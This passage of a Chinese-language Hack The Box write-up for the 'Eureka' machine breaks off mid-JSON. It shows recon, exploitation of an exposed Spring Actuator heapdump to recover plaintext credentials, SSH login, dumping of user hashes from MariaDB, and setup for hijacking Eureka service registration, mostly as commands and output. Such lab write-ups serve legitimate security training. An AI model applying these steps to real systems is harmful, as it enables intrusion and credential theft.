{"pageProps":{"postData":{"id":"HackTheBoxMachine - Eureka","contentHtml":"<h1>Machine - Eureka</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Eureka\">https://app.hackthebox.com/machines/Eureka</a> | <code>Hard</code></p>\n</blockquote>\n<p>PS：尤里卡发动！所有奇观建造提速 30% !</p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Eureka nmap -sT -min-rate 10000 -p- 10.10.11.66\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 02:28 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.66\nHost is up (0.15s latency).\nNot shown: 65493 filtered tcp ports (no-response), 40 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Eureka nmap -sT -A -T4 -O -p 22,80 10.10.11.66\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 02:36 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> eureka.htb (10.10.11.66)\nHost is up (0.19s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)\n|   256 90:11:9d:67:b6:f6:64:d4:<span class=\"hljs-built_in\">df</span>:7f:ed:4a:90:2e:6d:7b (ECDSA)\n|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://furni.htb/\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   442.32 ms 10.10.16.1\n2   139.60 ms eureka.htb (10.10.11.66)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 33.95 seconds\n</code></pre>\n<h2>Web 渗透</h2>\n<h3>信息收集</h3>\n<p>WhatWeb</p>\n<pre><code class=\"hljs language-bash\">➜  Eureka whatweb furni.htb                                                                             \nhttp://furni.htb [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.66], Meta-Author[Untree.co], Script, Title[Furni | Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image.png\" alt=\"image.png\"></p>\n<p>页面上的一些操作要进行登陆后才能进行操作</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image1.png\" alt=\"image.png\"></p>\n<p>抓个包分析一下框架</p>\n<pre><code class=\"hljs language-bash\">➜  Eureka curl -i http://furni.htb                                                                                                                                                                                                  \nHTTP/1.1 200 OK                                                                                                                                                                                                                     \nServer: nginx/1.18.0 (Ubuntu)                                                                                                                                                                                                       \nDate: Sun, 27 Apr 2025 06:48:57 GMT                                                                                                                                                                                                 \nContent-Type: text/html;charset=UTF-8                                                                                                                                                                                               \nTransfer-Encoding: chunked                                                                                                                                                                                                          \nConnection: keep-alive                                                                                                                                                                                                              \nVary: Origin                                                                                                                                                                                                                        \nVary: Access-Control-Request-Method                                                                                                                                                                                                 \nVary: Access-Control-Request-Headers                                                                                                                                                                                                \nX-Content-Type-Options: nosniff\nX-XSS-Protection: 0\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\nPragma: no-cache\nExpires: 0\nX-Frame-Options: DENY\nContent-Language: en-US\n</code></pre>\n<p><strong>nginx</strong> 是前端 Web Server（反代或直接服务）。</p>\n<p><strong>Content-Type 是 text/html;charset=UTF-8</strong>，一般就是标准网页。</p>\n<p><strong>X-Content-Type-Options: nosniff</strong> 和 <strong>X-Frame-Options: DENY</strong> 这些是常见的安全 HTTP 头，一般 Java、Spring Boot、或者 ASP.NET Core 这种现代后端框架会加上这些头。</p>\n<p><strong>Cache-Control: no-cache, no-store, max-age=0, must-revalidate</strong>，这种强制禁止缓存的策略，也常见于 <strong>Spring Boot</strong>，尤其是默认模板生成的网站。</p>\n<p>再加上 <code>Content-Language: en-US</code>，和 <code>Pragma: no-cache</code> 这种写法，也很像 Java 系列应用。</p>\n<p><strong>所以，综合来看，后端很可能是 Java 系的框架，极有可能是</strong>：<strong>Spring Boot</strong></p>\n<hr>\n<p>目录扫描也确定了这一点，扫描出来了<code>/actuator</code> 目录，并且返回 200</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image2.png\" alt=\"image.png\"></p>\n<h3>Spring acturtor 未授权</h3>\n<p>存在未授权访问</p>\n<pre><code class=\"hljs language-bash\">curl http://furni.htb/actuator/env\n</code></pre>\n<p>能发现网站根目录：<code>/var/www/web/Furni</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image3.png\" alt=\"image.png\"></p>\n<p>并且目录扫描中还从扫描出来了 <code>/actuator/heapdump</code> （<code>Heap dump</code> 为渗透测试者提供了对内存中所有对象的可视化访问，是发现和验证敏感信息泄露、业务逻辑缺陷及内存破坏漏洞的重要手段。）</p>\n<pre><code class=\"hljs language-bash\">[03:08:56] 200 -   76MB - /actuator/heapdump\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Eureka curl http://furni.htb/actuator/heapdump --output heapdump \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 76.4M  100 76.4M    0     0  1472k      0  0:00:53  0:00:53 --:--:--  477k\n</code></pre>\n<p>使用 工具对其进行分析</p>\n<pre><code class=\"hljs language-bash\">➜  Eureka java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump                                                                                                                                                                      \nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class=\"hljs-literal\">true</span>                                                                                                                                                       \n===========================================                                                                                                                                                                                         \nSpringDataSourceProperties\n-------------\npassword = 0sc@r190_S0l!dP@sswd\ndriverClassName = com.mysql.cj.jdbc.Driver\nurl = jdbc:mysql://localhost:3306/Furni_WebApp_DB\nusername = oscar190\n===========================================\nHikariDataSource\n-------------\njava.lang.NumberFormatException: Cannot parse null string \n===========================================\nOriginTrackedMapPropertySource\n-------------                  \nmanagement.endpoints.web.exposure.include = *\nspring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver\nspring.cloud.inetutils.ignoredInterfaces = enp0s.*\neureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/\nserver.forward-headers-strategy = native   \nspring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB\nspring.application.name = Furni\nserver.port = 8082\nspring.jpa.properties.hibernate.format_sql = <span class=\"hljs-literal\">true</span>\nspring.session.store-type = jdbc           \nspring.jpa.hibernate.ddl-auto = none\n-------------                                                \nUserPassSearcher                           \n.... many Message ....\n</code></pre>\n<p>喂给GPT上进行分析，其中最关键的信息是：</p>\n<pre><code class=\"hljs language-bash\">username = oscar190  \npassword = 0sc@r190_S0l!dP@sswd  \nurl      = jdbc:mysql://localhost:3306/Furni_WebApp_DB  \n</code></pre>\n<table>\n<thead>\n<tr>\n<th>配置项</th>\n<th>含义</th>\n<th>安全影响／风险</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>management.endpoints.web.exposure.include = *</code></td>\n<td>Actuator 暴露所有管理端点（包括 <code>/heapdump</code>, <code>/env</code>, <code>/beans</code> 等）</td>\n<td><strong>高危</strong>：攻击者可访问任意管理端点，下载堆快照、查看环境变量、动态修改日志级别，甚至执行敏感操作。</td>\n</tr>\n<tr>\n<td><code>spring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver</code></td>\n<td>JDBC 驱动类，使用 MySQL Connector/J</td>\n<td>无直接风险，但表明后续 URL、凭据可用于 MySQL 连接。</td>\n</tr>\n<tr>\n<td><code>spring.cloud.inetutils.ignoredInterfaces = enp0s.*</code></td>\n<td>Spring Cloud InetUtils 忽略以 <code>enp0s.*</code> 命名的网络接口</td>\n<td>较低风险；影响服务注册时记录的 IP，与实际可达 IP 可能不一致。</td>\n</tr>\n<tr>\n<td><code>eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/</code></td>\n<td>Eureka 客户端注册中心地址，包含明文用户名和密码</td>\n<td><strong>高危</strong>：可查询/下线其他微服务实例，破坏服务可用性或窃取更多配置信息。</td>\n</tr>\n<tr>\n<td><code>server.forward-headers-strategy = native</code></td>\n<td>代理环境下转发 HTTP 头（如 X-Forwarded-*）</td>\n<td>较低风险；可能影响日志中记录的真实客户端 IP，但对渗透价值有限。</td>\n</tr>\n<tr>\n<td><code>spring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB</code></td>\n<td>JDBC 连接 URL，指向本地 MySQL 数据库</td>\n<td>已结合凭据可直接连接数据库，若数据库允许运行外部连接，可远程利用。</td>\n</tr>\n<tr>\n<td><code>spring.application.name = Furni</code></td>\n<td>应用在 Eureka 或其他注册中心中的名称</td>\n<td>低风险；可用于识别服务拓扑，但对攻击无直接帮助。</td>\n</tr>\n<tr>\n<td><code>server.port = 8082</code></td>\n<td>应用监听的 HTTP 端口</td>\n<td>揭示可访问的端口，渗透测试时可针对该端口进行探测与攻击。</td>\n</tr>\n<tr>\n<td><code>spring.jpa.properties.hibernate.format_sql = true</code></td>\n<td>Hibernate 打印 SQL 时格式化输出</td>\n<td>低风险；仅影响日志可读性，无安全影响。</td>\n</tr>\n<tr>\n<td><code>spring.session.store-type = jdbc</code></td>\n<td>Spring Session 存储策略，表示会话数据存入数据库</td>\n<td>中等风险：会话信息、Session ID 存库，攻击者可尝试读取或篡改会话表以进行会话固定或劫持。</td>\n</tr>\n<tr>\n<td><code>spring.jpa.hibernate.ddl-auto = none</code></td>\n<td>Hibernate 不会自动创建、更新或验证数据库结构</td>\n<td>低风险；表示应用不会修改表结构。</td>\n</tr>\n</tbody>\n</table>\n<h3>Spring Eureka</h3>\n<p>Spring Eureka 是一个服务注册中心，是用来实现微服务之间<strong>自动注册和发现</strong>的工具</p>\n<p>分析中发现，账号密码也展示出来了 <code>EurekaSrvr:0scarPWDisTheB3st</code></p>\n<table>\n<thead>\n<tr>\n<th><code>eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/</code></th>\n<th>Eureka 客户端注册中心地址，包含明文用户名和密码</th>\n<th><strong>高危</strong>：可查询/下线其他微服务实例，破坏服务可用性或窃取更多配置信息。</th>\n</tr>\n</thead>\n</table>\n<p>能发现服务器在好几个端口运行着服务</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image4.png\" alt=\"image.png\"></p>\n<h2>提权 - To Miranda</h2>\n<h3>信息收集</h3>\n<p>之前上面还发现呢一组账号密码<code>oscar190:0sc@r190_S0l!dP@sswd</code></p>\n<p>尝试 SSH 登录，发现成功了</p>\n<pre><code class=\"hljs language-bash\">➜  Eureka ssh oscar190@10.10.11.66\nThe authenticity of host <span class=\"hljs-string\">'10.10.11.66 (10.10.11.66)'</span> can<span class=\"hljs-string\">'t be established.\nED25519 key fingerprint is SHA256:5/rCExVFUnFdG5UFLnW7ExQuyelBwtSqwHzBiWKqza0.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '</span>10.10.11.66<span class=\"hljs-string\">' (ED25519) to the list of known hosts.\noscar190@10.10.11.66'</span>s password: \n\nLast login: Sun Apr 27 07:31:27 2025 from 10.10.16.59\noscar190@eureka:~$ \n</code></pre>\n<p>用户信息</p>\n<pre><code class=\"hljs language-bash\">oscar190@eureka:/home$ <span class=\"hljs-built_in\">ls</span>\nmiranda-wise  oscar190\n</code></pre>\n<p>监听的端口</p>\n<pre><code class=\"hljs language-bash\">oscar190@eureka:~$ ss -tulpn\nNetid                 State                   Recv-Q                  Send-Q                                        Local Address:Port                                    Peer Address:Port                 Process                 \nudp                   UNCONN                  0                       0                                             127.0.0.53%lo:53                                           0.0.0.0:*                                            \nudp                   UNCONN                  0                       0                                                         *:37093                                              *:*                                            \nudp                   UNCONN                  0                       0                                                         *:49730                                              *:*                                            \nudp                   UNCONN                  0                       0                                                         *:52181                                              *:*                                            \nudp                   UNCONN                  0                       0                                                         *:36551                                              *:*                                            \ntcp                   LISTEN                  0                       511                                                 0.0.0.0:80                                           0.0.0.0:*                                            \ntcp                   LISTEN                  0                       4096                                          127.0.0.53%lo:53                                           0.0.0.0:*                                            \ntcp                   LISTEN                  0                       128                                                 0.0.0.0:22                                           0.0.0.0:*                                            \ntcp                   LISTEN                  0                       80                                                127.0.0.1:3306                                         0.0.0.0:*                                            \ntcp                   LISTEN                  0                       4096                                     [::ffff:127.0.0.1]:8080                                               *:*                                            \ntcp                   LISTEN                  0                       511                                                    [::]:80                                              [::]:*                                            \ntcp                   LISTEN                  0                       100                                      [::ffff:127.0.0.1]:8081                                               *:*                                            \ntcp                   LISTEN                  0                       100                                      [::ffff:127.0.0.1]:8082                                               *:*                                            \ntcp                   LISTEN                  0                       128                                                    [::]:22                                              [::]:*                                            \ntcp                   LISTEN                  0                       100                                                       *:8761                                               *:*  \n</code></pre>\n<p>结合之前的信息，我们去访问一下数据库</p>\n<pre><code class=\"hljs language-bash\">username = oscar190  \npassword = 0sc@r190_S0l!dP@sswd  \nurl      = jdbc:mysql://localhost:3306/Furni_WebApp_DB  \n</code></pre>\n<pre><code class=\"hljs language-bash\">oscar190@eureka:/home$ mysql -uoscar190 -p\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection <span class=\"hljs-built_in\">id</span> is 400\nServer version: 10.3.39-MariaDB-0ubuntu0.20.04.2 Ubuntu 20.04\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType <span class=\"hljs-string\">'help;'</span> or <span class=\"hljs-string\">'\\h'</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">help</span>. Type <span class=\"hljs-string\">'\\c'</span> to clear the current input statement.\n\nMariaDB [(none)]> \n</code></pre>\n<pre><code class=\"hljs language-bash\">ariaDB [Furni_WebApp_DB]> <span class=\"hljs-keyword\">select</span> * from SPRING_SESSION;                                                                                                                                                                            \n+--------------------------------------+--------------------------------------+---------------+------------------+-----------------------+---------------+------------------------+                                                 \n| PRIMARY_ID                           | SESSION_ID                           | CREATION_TIME | LAST_ACCESS_TIME | MAX_INACTIVE_INTERVAL | EXPIRY_TIME   | PRINCIPAL_NAME         |                                                 \n+--------------------------------------+--------------------------------------+---------------+------------------+-----------------------+---------------+------------------------+ \n| 10233918-ae1b-42fb-be6f-5f9964cf1bd4 | 4e178510-cbab-422a-9aec-2d220d4aac84 | 1745739662223 |    1745739664438 |                  1800 | 1745741464438 | miranda.wise@furni.htb |                                                 \n| 13332183-199d-4684-ada9-cb6d4a369d3d | 291a60aa-1a92-4f7b-b46e-b2050b972752 | 1745739481031 |    1745739481182 |                  1800 | 1745741281182 | miranda.wise@furni.htb |  \n| fa2e36a0-151d-486f-b2c3-0a620a9c21f5 | 19028783-c10e-44b3-9770-8e7137cde452 | 1745739541041 |    1745739541597 |                  1800 | 1745741341597 | miranda.wise@furni.htb |\n| fcbcfc2f-66a4-41c7-97cc-36cb09cf2e83 | 6dde7be1-48d9-4188-948b-947be5308ab6 | 1745739181290 |    1745739181563 |                  1800 | 1745740981563 | miranda.wise@furni.htb |\n</code></pre>\n<pre><code class=\"hljs language-bash\">MariaDB [Furni_WebApp_DB]> <span class=\"hljs-keyword\">select</span> * from <span class=\"hljs-built_in\">users</span>;\n+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+\n| <span class=\"hljs-built_in\">id</span> | first_name | last_name | email                   | password                                                     | is_staff |\n+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+\n|  2 | Kamel      | Mossab    | k.mossab110@eloquia.htb | $2a$10<span class=\"hljs-variable\">$J4yap5ZxviliZO9jBCuSdeD</span>.7LzL3/njVpNhnG85HCcwA05ulUrzW |        0 |\n|  4 | Lorra      | Barker    | lorra199@gmail.com      | $2a$10<span class=\"hljs-variable\">$DgUDWpxipW2Yt7UcKxzvweB7FXoV</span>/LFxlJG8yuL56NyUMMLr5uBuK |        0 |\n|  5 | Martin     | Wood      | mwood@gmail.com         | $2a$10<span class=\"hljs-variable\">$3LDYl5QEt4K4u8vLWMGH8eDA</span>/fNKVquhHNbyijaDzzueKHAwi6bHO |        0 |\n|  8 | Roberto    | Dalton    | roberto0xd@outlook.com  | $2a$10<span class=\"hljs-variable\">$4TLCSlEfYrNDFfPDQ5z4p</span>.S6gImA8NKAGn2tyqLJyG71l9iQoTDhu |        0 |\n|  9 | Miranda    | Wise      | miranda.wise@furni.htb  | $2a$10<span class=\"hljs-variable\">$T4L873JALnbXH10tq</span>.mEbOOVYmZPLlBBSeD1h2hqAeX6nbTDXMyqm |        1 |\n| 10 | Oscar      | Dalton    | oscar190@furni.htb      | $2a$10<span class=\"hljs-variable\">$ye9a40a7KOyBJKUai2qxY</span>.fcfVQGlFTM3SVSVcn82wxQf/2zYPq96 |        1 |\n| 11 | Nya        | Dalton    | nya190@furni.htb        | $2a$10<span class=\"hljs-variable\">$GZQOgzb4N1xVs3ALpnuqGeId5</span>/mZLL8pv5GlkRzJfxdFxO/JIkIaK |        1 |\n| 12 | lucas      | carols    | logok12976@pelung.com   | $2a$10<span class=\"hljs-variable\">$J93xmU0</span>.yP0/oZmoV9K4u.XvYHtl.kunSX9xoe2RACqKcitM4OjlC |        0 |\n| 15 | <span class=\"hljs-built_in\">test</span>       | <span class=\"hljs-built_in\">test</span>      | <span class=\"hljs-built_in\">test</span>@test.com           | $2a$10<span class=\"hljs-variable\">$KhEKRdaMX4axuvRkGw3wLuehQMBPMVlQ2astA3sR</span>.toEjh63rbQWG |        0 |\n+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+\n9 rows <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (0.000 sec)\n</code></pre>\n<p>将密码放后台进行爆破</p>\n<p>然后上传 <code>pspy64</code> 监测一下后台，发现 <code>/opt/log_analyse.sh</code> 和 <code>/opt/scripts/miranda-Login-Simulator.sh</code> 两个脚本，第二个脚本应该是模拟<code>miranda</code>用户登录Web然后在数据库中留下<code>SESSION</code></p>\n<pre><code class=\"hljs language-bash\">2025/04/27 07:53:09 CMD: UID=0     PID=2026725 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log                                                                                                       \n2025/04/27 07:53:09 CMD: UID=0     PID=2026723 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log                                                                                                       \n2025/04/27 07:53:09 CMD: UID=1000  PID=2026682 | ./pspy64                                                                                                                                                                           \n2025/04/27 07:53:09 CMD: UID=0     PID=2026681 | curl http://furni.htb/login   -H Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 -H Accept-Language: en-US,en;q=0.8 -H Cac\nhe-Control: max-age=0 -H Connection: keep-alive -H Content-Type: application/x-www-form-urlencoded -H Cookie: SESSION=YWQ0ZWE5YTAtODgzYi00ZGNjLWIyY2EtYjg0NTUxMTkxMTdm -H User-Agent: Mozilla/5.0 (X11; Linux x86_64) --data @/tmp/t\nmp.Wgy2TkeN8L --insecure -i                                                                                                                                                                                                         \n2025/04/27 07:53:09 CMD: UID=0     PID=2026601 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh                                                                                                                                  \n2025/04/27 07:53:09 CMD: UID=0     PID=2026600 | /bin/sh -c /opt/scripts/miranda-Login-Simulator.sh  \n</code></pre>\n<p>那么就是说在一定时间会运行该脚本，并且携带<code>miranda</code>的账户密码去进行登录。</p>\n<p>现在我们应该去通过某种方式去获得数据包</p>\n<h3>Spring Eureka 截取流量</h3>\n<p>佬们分享了一篇文章：<a href=\"https://medium.com/@mfocuz/hacking-netflix-eureka-8e5957b2f539\">https://medium.com/@mfocuz/hacking-netflix-eureka-8e5957b2f539</a></p>\n<p>其中就有关于<strong>流量劫持</strong>的，大致就是：攻击者将注册 <em><strong>webservice</strong></em> 实例并将其指向恶意服务器，或者替换掉原本的实例，在靶机中可能是 <strong>USER-MANAGEMENT-SERVICE</strong></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image5.png\" alt=\"image.png\"></p>\n<p>从 <code>heapdump</code> 中导出的数据中</p>\n<pre><code class=\"hljs language-bash\">eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/\n</code></pre>\n<p>可以知道 Eureka Client，默认要连接的 Eureka Server 地址是 <code>http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/</code>，而且访问时要用账号密码认证。</p>\n<p>需要使用本地地址进行访问，那么就要用 <code>SSH</code> 将端口转发出来</p>\n<pre><code class=\"hljs language-bash\">ssh -L 8761:localhost:8761 oscar190@10.10.11.66\n</code></pre>\n<p><code>kali</code>监听端口</p>\n<pre><code class=\"hljs language-bash\">➜  Eureka nc -lvp 8081\nlistening on [any] 8081 ...\n</code></pre>\n<p>然后查看 <code>/eureka/apps/USER-MANAGEMENT-SERVICE</code> 原本的内容</p>\n<pre><code class=\"hljs language-bash\">➜  Eureka curl <span class=\"hljs-string\">'http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE'</span> -H <span class=\"hljs-string\">\"Accept: application/json\"</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">{\n  <span class=\"hljs-string\">\"application\"</span>: {\n    <span class=\"hljs-string\">\"name\"</span>: <span class=\"hljs-string\">\"USER-MANAGEMENT-SERVICE\"</span>,\n    <span class=\"hljs-string\">\"instance\"</span>: [\n      {\n        <span class=\"hljs-string\">\"instanceId\"</span>: <span class=\"hljs-string\">\"192.168.40.130:user-management-service:6969\"</span>,\n        <span class=\"hljs-string\">\"hostName\"</span>: <span class=\"hljs-string\">\"192.168.40.130\"</span>,\n        <span class=\"hljs-string\">\"app\"</span>: <span class=\"hljs-string\">\"USER-MANAGEMENT-SERVICE\"</span>,\n        <span class=\"hljs-string\">\"ipAddr\"</span>: <span class=\"hljs-string\">\"192.168.40.130\"</span>,\n        <span class=\"hljs-string\">\"status\"</span>: <span class=\"hljs-string\">\"UP\"</span>,\n        <span class=\"hljs-string\">\"overriddenStatus\"</span>: <span class=\"hljs-string\">\"UNKNOWN\"</span>,\n        <span class=\"hljs-string\">\"port\"</span>: {\n          <span class=\"hljs-string\">\"$\"</span>: 6969,\n          <span class=\"hljs-string\">\"@enabled\"</span>: <span class=\"hljs-string\">\"true\"</span>\n        },\n        <span class=\"hljs-string\">\"securePort\"</span>: {\n          <span class=\"hljs-string\">\"$\"</span>: 9443,\n          <span class=\"hljs-string\">\"@enabled\"</span>: <span class=\"hljs-string\">\"false\"</span>\n        },\n        <span class=\"hljs-string\">\"countryId\"</span>: 1,\n        <span class=\"hljs-string\">\"dataCenterInfo\"</span>: {\n          <span class=\"hljs-string\">\"@class\"</span>: <span class=\"hljs-string\">\"com.netflix.appinfo.InstanceInfo<span class=\"hljs-variable\">$DefaultDataCenterInfo</span>\"</span>,\n          <span class=\"hljs-string\">\"name\"</span>: <span class=\"hljs-string\">\"MyOwn\"</span>\n        },\n        <span class=\"hljs-string\">\"leaseInfo\"</span>: {\n          <span class=\"hljs-string\">\"renewalIntervalInSecs\"</span>: 30,\n          <span class=\"hljs-string\">\"durationInSecs\"</span>: 90,\n          <span class=\"hljs-string\">\"registrationTimestamp\"</span>: 1745749189827,\n          <span class=\"hljs-string\">\"lastRenewalTimestamp\"</span>: 1745749189827,\n          <span class=\"hljs-string\">\"evictionTimestamp\"</span>: 0,\n          <span class=\"hljs-string\">\"serviceUpTimestamp\"</span>: 1745749189827\n        },\n        <span class=\"hljs-string\">\"metadata\"</span>: {\n          <span class=\"hljs-string\">\"zone\"</span>: <span class=\"hljs-string\">\"default\"</span>,\n          <span class=\"hljs-string\">\"management.port\"</span>: <span class=\"hljs-string\">\"6969\"</span>\n        },\n        <span class=\"hljs-string\">\"homePageUrl\"</span>: <span class=\"hljs-string\">\"http://192.168.40.130:6969/\"</span>,\n        <span class=\"hljs-string\">\"statusPageUrl\"</span>: <span class=\"hljs-string\">\"http://192.168.40.130:6969/info\"</span>,\n        <span class=\"hljs-string\">\"healthCheckUrl\"</span>: <span class=\"hljs-string\">\"http://192.168.40.130:6969/health\"</span>,\n        <span class=\"hljs-string\">\"secureHealthCheckUrl\"</span>: <span class=\"hljs-string\">\"\"</span>,\n        <span class=\"hljs-string\">\"vipAddress\"</span>: <span class=\"hljs-string\">\"user-management-service\"</span>,\n        <span class=\"hljs-string\">\"secureVipAddress\"</span>: <span class=\"hljs-string\">\"user-management-service\"</span>,\n        <span class=\"hljs-string\">\"isCoordinatingDiscoveryServer\"</span>: <span class=\"hljs-string\">\"false\"</span>,\n        <span class=\"hljs-string\">\"lastUpdatedTimestamp\"</span>: <span class=\"hljs-string\">\"1745749189827\"</span>,\n        <span class=\"hljs-string\">\"lastDirtyTimestamp\"</span>: <span class=\"hljs-string\">\"1745750384661\"</span>,\n        <span class=\"hljs-string\">\"actionType\"</span>: <span class=\"hljs-string\">\"ADDED\"</span>\n      },\n      {\n        <span class=\"hljs-string\">\"instanceId\"</span>: <span class=\"hljs-string\">\"localhost:USER-MANAGEMENT-SERVICE:8081\"</span>,\n        <span class=\"hljs-string\">\"hostName\"</span>: <span class=\"hljs-string\">\"localhost\"</span>,\n        <span class=\"hljs-string\">\"app\"</span>: <span class=\"hljs-string\">\"USER-MANAGEMENT-SERVICE\"</span>,\n        <span class=\"hljs-string\">\"ipAddr\"</span>: <span class=\"hljs-string\">\"10.10.11.66\"</span>,\n        <span class=\"hljs-string\">\"status\"</span>: <span class=\"hljs-string\">\"UP\"</span>,\n        <span class=\"hljs-string\">\"overriddenStatus\"</span>: <span class=\"hljs-string\">\"UNKNOWN\"</span>,\n        <span class=\"hljs-string\">\"port\"</span>: {\n          <span class=\"hljs-string\">\"$\"</span>: 8081,\n          <span class=\"hljs-string\">\"@enabled\"</span>: <span class=\"hljs-string\">\"true\"</span>\n        },\n        <span class=\"hljs-string\">\"securePort\"</span>: {\n          <span class=\"hljs-string\">\"$\"</span>: 443,\n          <span class=\"hljs-string\">\"@enabled\"</span>: <span class=\"hljs-string\">\"false\"</span>\n        },\n        <span class=\"hljs-string\">\"countryId\"</span>: 1,\n        <span class=\"hljs-string\">\"dataCenterInfo\"</span>: {\n          <span class=\"hljs-string\">\"@class\"</span>: <span class=\"hljs-string\">\"com.netflix.appinfo.InstanceInfo<span class=\"hljs-variable\">$DefaultDataCenterInfo</span>\"</span>,\n          <span class=\"hljs-string\">\"name\"</span>: <span class=\"hljs-string\">\"MyOwn\"</span>\n        },\n        <span class=\"hljs-string\">\"leaseInfo\"</span>: {\n          <span class=\"hljs-string\">\"renewalIntervalInSecs\"</span>: 30,\n          <span class=\"hljs-string\">\"durationInSecs\"</span>: 90,\n          <span class=\"hljs-string\">\"registrationTimestamp\"</span>: 1745747961808,\n          <span class=\"hljs-string\">\"lastRenewalTimestamp\"</span>: 1745755807954,\n          <span class=\"hljs-string\">\"evictionTimestamp\"</span>: 0,\n          <span class=\"hljs-string\">\"serviceUpTimestamp\"</span>: 1745747961808\n        },\n        <span class=\"hljs-string\">\"metadata\"</span>: {\n          <span class=\"hljs-string\">\"management.port\"</span>: <span class=\"hljs-string\">\"8081\"</span>\n        },\n        <span class=\"hljs-string\">\"homePageUrl\"</span>: <span class=\"hljs-string\">\"http://localhost:8081/\"</span>,\n        <span class=\"hljs-string\">\"statusPageUrl\"</span>: <span class=\"hljs-string\">\"http://localhost:8081/actuator/info\"</span>,\n        <span class=\"hljs-string\">\"healthCheckUrl\"</span>: <span class=\"hljs-string\">\"http://localhost:8081/actuator/health\"</span>,\n        <span class=\"hljs-string\">\"vipAddress\"</span>: <span class=\"hljs-string\">\"USER-MANAGEMENT-SERVICE\"</span>,\n        <span class=\"hljs-string\">\"secureVipAddress\"</span>: <span class=\"hljs-string\">\"USER-MANAGEMENT-SERVICE\"</span>,\n        <span class=\"hljs-string\">\"isCoordinatingDiscoveryServer\"</span>: <span class=\"hljs-string\">\"false\"</span>,\n        <span class=\"hljs-string\">\"lastUpdatedTimestamp\"</span>: <span class=\"hljs-string\">\"1745747961808\"</span>,\n        <span class=\"hljs-string\">\"lastDirtyTimestamp\"</span>: <span class=\"hljs-string\">\"1745747961026\"</span>,\n        <span class=\"hljs-string\">\"actionType\"</span>: <span 